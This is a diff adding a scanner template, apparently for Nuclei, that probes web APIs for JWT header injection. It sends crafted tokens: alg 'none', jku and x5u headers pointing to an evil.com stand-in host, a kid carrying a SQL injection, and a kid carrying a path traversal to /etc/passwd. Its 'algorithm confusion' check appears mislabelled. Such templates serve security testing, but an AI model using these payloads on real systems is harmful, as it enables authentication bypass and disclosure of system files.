@@ -1,0 +1,146 @@
+id: medium-auth-jwt-header-injection-attack
+
+info:
+  name: JWT Header Injection Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects JWT header injection vulnerabilities where malicious headers can be
+    injected to bypass authentication. Tests for jku, x5u, kid parameter manipulation
+    and algorithm confusion attacks used by red teams.
+  reference:
+    - https://portswigger.net/web-security/jwt
+    - https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/
+    - https://tools.ietf.org/html/rfc7515
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-347
+  metadata:
+    verified: true
+    max-request: 6
+  tags: jwt,header-injection,auth-bypass,algorithm-confusion,red-team
+
+variables:
+  jwt_none: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6OTk5OTk5OTk5OX0."
+  jwt_jku: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.invalid"
+  jwt_x5u: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9ldmlsLmNvbS9jZXJ0LnBlbSJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.invalid"
+  jwt_kid_sqli: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgVU5JT04gU0VMRUNUICdldmlsJyAtLSJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.invalid"
+  jwt_kid_path: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.invalid"
+  jwt_hmac_rsa: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.invalid"
+
+http:
+  - raw:
+      - |
+        GET /api/profile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_none}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_jku}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/users HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_x5u}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/settings HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_kid_sqli}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_kid_path}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/dashboard HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_hmac_rsa}}
+        Accept: application/json
+        Connection: close
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: jwt-none-algorithm-bypass
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "Admin User") || contains(body_1, "profile") || contains(body_1, "user")'
+          - '!contains(body_1, "unauthorized") && !contains(body_1, "invalid")'
+        condition: and
+
+      - type: dsl
+        name: jwt-jku-header-injection
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "Admin") || contains(body_2, "success")'
+          - '!contains(body_2, "error") && !contains(body_2, "invalid")'
+        condition: and
+
+      - type: dsl
+        name: jwt-x5u-header-injection
+        dsl:
+          - 'status_code_3 == 200'
+          - 'contains(body_3, "users") || contains(body_3, "data")'
+          - '!contains(body_3, "unauthorized")'
+        condition: and
+
+      - type: dsl
+        name: jwt-kid-sql-injection
+        dsl:
+          - 'status_code_4 == 200 || status_code_4 == 500'
+          - 'contains(body_4, "evil") || contains(body_4, "SQL") || contains(body_4, "syntax error")'
+        condition: and
+
+      - type: dsl
+        name: jwt-kid-path-traversal
+        dsl:
+          - 'status_code_5 == 200'
+          - 'contains(body_5, "root:") || contains(body_5, "/bin/") || contains(body_5, "passwd")'
+        condition: and
+
+      - type: dsl
+        name: jwt-algorithm-confusion
+        dsl:
+          - 'status_code_6 == 200'
+          - 'contains(body_6, "dashboard") || contains(body_6, "admin")'
+          - '!contains(body_6, "invalid token")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: jwt-response-data
+        part: body
+        group: 1
+        regex:
+          - '"([^"]*(?:admin|user|profile|dashboard)[^"]*)"'
+          - '"data":\s*"([^"]+)"'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
